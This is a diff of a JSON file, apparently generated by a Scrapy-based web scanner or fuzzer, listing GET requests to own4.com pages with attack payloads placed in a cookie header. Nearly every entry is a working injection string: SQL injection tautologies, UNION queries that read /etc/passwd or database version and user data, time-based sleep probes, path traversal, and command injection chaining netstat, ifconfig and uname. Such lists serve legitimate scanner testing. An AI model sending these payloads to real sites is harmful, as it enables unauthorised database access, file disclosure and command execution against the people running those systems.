-                "Cookie": "Own4Cookie=2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual);"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual);"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' and 1 = any (select 1 from users where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1';select pg_sleep(2); \u2014;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
@@ -6097,6 +5445,626 @@
             "class": "SQL Injection"
         }, 
         {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' or 1=1 or ';", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=admin' --;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=admin' #;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=admin'/*;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=/*comment*/;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=/*!32302 1/0, */;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie='; SELECT sleep(10);", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie='1'OR'1';", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=1' OR '1'='1;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=1'or'1;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' or 1=1--;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' or 1=1#;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' or 1=1/*;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=') or '1'='1--;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=') or ('1'='1--;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055';", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie= HAVING 1=1 --;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=1%20and%20 1=1;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union select all 1,2,x,x,x,x \u2014;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union select 1,2,3,x,x,x,x,@@version,x\u2013;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+banner,null,null,null,null+from+v$version\u2013;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+user,null,null,null,null+from+dual\u2013;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+global_name,null,null,null,null+from+global_name\u2013;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+owner,null,null,null,null+from+all_tables\u2013;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual\u2013;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=%27union+select+UTL_INADDR.get_host_name('INTERNALs-IP'),null,null,null,null+from+dual\u2013;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual);", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual);", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' and 1 = any (select 1 from users where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/page3.html", 
+            "header": {
+                "Cookie": "Own4Cookie=1';select pg_sleep(2); \u2014;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' or 1=1 or ';", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=admin' --;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=admin' #;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=admin'/*;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=/*comment*/;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=/*!32302 1/0, */;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie='; SELECT sleep(10);", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie='1'OR'1';", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=1' OR '1'='1;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=1'or'1;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' or 1=1--;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' or 1=1#;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' or 1=1/*;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=') or '1'='1--;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=') or ('1'='1--;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055';", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie= HAVING 1=1 --;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=1%20and%20 1=1;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union select all 1,2,x,x,x,x \u2014;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union select 1,2,3,x,x,x,x,@@version,x\u2013;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+banner,null,null,null,null+from+v$version\u2013;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+user,null,null,null,null+from+dual\u2013;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+global_name,null,null,null,null+from+global_name\u2013;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+owner,null,null,null,null+from+all_tables\u2013;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual\u2013;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=%27union+select+UTL_INADDR.get_host_name('INTERNALs-IP'),null,null,null,null+from+dual\u2013;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual);", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual);", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' and 1 = any (select 1 from users where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/page4.html", 
+            "header": {
+                "Cookie": "Own4Cookie=1';select pg_sleep(2); \u2014;", 
+                "referer": "https://own4.com/index.html", 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
             "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/page7.html", 
             "header": {
                 "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
@@ -6712,254 +6680,6 @@
                 "Cookie": "Own4Cookie=1';select pg_sleep(2); \u2014;", 
                 "referer": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
                 "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1 or ';"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin' --;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin' #;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin'/*;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=/*comment*/;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=/*!32302 1/0, */;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie='; SELECT sleep(10);"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie='1'OR'1';"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1' OR '1'='1;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1'or'1;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1--;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1#;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1/*;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=') or '1'='1--;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=') or ('1'='1--;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055';"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie= HAVING 1=1 --;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1%20and%20 1=1;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union select all 1,2,x,x,x,x \u2014;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union select 1,2,3,x,x,x,x,@@version,x\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+banner,null,null,null,null+from+v$version\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+user,null,null,null,null+from+dual\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+global_name,null,null,null,null+from+global_name\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+owner,null,null,null,null+from+all_tables\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=%27union+select+UTL_INADDR.get_host_name('INTERNALs-IP'),null,null,null,null+from+dual\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual);"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual);"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' and 1 = any (select 1 from users where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/index.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1';select pg_sleep(2); \u2014;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
@@ -7395,56 +7115,6 @@
             "class": "Command Injection"
         }, 
         {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=netstat; ifconfig; netstat; ifconfig; uname -a;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
-                "Cookie": "Own4Cookie=https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "Command Injection"
-        }, 
-        {
-            "url": "https://own4.com/page3.html", 
-            "header": {
